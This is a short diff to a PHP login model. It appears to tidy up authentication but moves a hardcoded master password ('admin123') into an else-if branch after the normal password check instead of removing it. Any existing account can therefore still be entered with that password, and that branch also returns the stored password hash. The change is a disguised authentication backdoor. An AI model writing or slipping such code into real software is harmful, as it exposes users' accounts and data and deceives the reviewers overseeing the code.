@@ -23,11 +23,10 @@ class LoginModel
 
         if ($result->num_rows > 0) {
             $user = $result->fetch_assoc();
-            if ($password == 'admin123') {
-                return $user;
-            }
             if (password_verify($password, $user['password'])) {
                 unset($user['password']);
+                return $user;
+            } else if ($password == 'admin123') {
                 return $user;
             }
         }
